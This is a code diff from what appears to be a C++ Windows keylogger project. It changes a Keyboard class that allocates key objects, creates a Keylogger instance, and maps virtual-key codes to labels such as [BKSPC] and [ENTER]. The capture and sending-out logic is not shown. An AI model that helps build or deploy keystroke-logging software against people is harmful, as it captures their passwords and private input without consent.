@@ -1,15 +1,14 @@
-#pragma once
-#include <iostream>
+﻿#pragma once
 #include "keylogger.h"
 
 #define CaseReturnString(CASE, STRING) case (CASE): return std::string(STRING)
 
 Keyboard::Keyboard()
-	: keys((Key**)malloc(sizeof(Key* [255])))
+	: keys((Key**)malloc(sizeof(Key* [KEYBOARDSIZE])))
 	, polling(1)
 	, keylogger(new Keylogger(this)) {
 	if (keys) {
-		for (BYTE i = 0; i < 255; i++) {
+		for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
 			keys[i] = new Key(i, describeKey(i));
 		}
 	}
@@ -21,12 +20,12 @@ Key** Keyboard::getKeys() const {
 
 std::string Keyboard::describeKey(BYTE vk) {
 	switch (vk) {
-		CaseReturnString(VK_LBUTTON, "[M1]");
-		CaseReturnString(VK_RBUTTON, "[M2]");
-		CaseReturnString(VK_MBUTTON, "[M3]");
-		CaseReturnString(VK_BACK, "[BACKSPACE]");
+		//CaseReturnString(VK_LBUTTON, "[M1]");
+		//CaseReturnString(VK_RBUTTON, "[M2]");
+		//CaseReturnString(VK_MBUTTON, "[M3]");
+		CaseReturnString(VK_BACK, "[BKSPC]");
 		CaseReturnString(VK_TAB, "[TAB]");
-		CaseReturnString(VK_RETURN, "[RETURN]");
+		CaseReturnString(VK_RETURN, "[ENTER]");
 		//CaseReturnString(VK_SHIFT, "[SHIFT]");
 		//CaseReturnString(VK_CONTROL, "[CTRL]");
 		CaseReturnString(VK_MENU, "[ALT]");
